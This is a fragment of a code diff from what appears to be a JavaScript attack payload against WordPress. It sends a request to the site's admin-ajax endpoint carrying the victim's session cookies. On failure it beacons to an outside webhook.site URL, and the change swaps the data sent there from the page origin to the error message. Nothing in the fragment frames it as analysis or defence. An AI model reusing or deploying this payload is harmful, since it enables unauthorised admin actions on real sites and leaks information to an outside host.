@@ -16,5 +16,5 @@ fetch("/wp-admin/admin-ajax.php", {
   "credentials": "include"
 });
 }catch(err){
-    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+document.location.origin);
+    fetch('https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?'+err);
 }
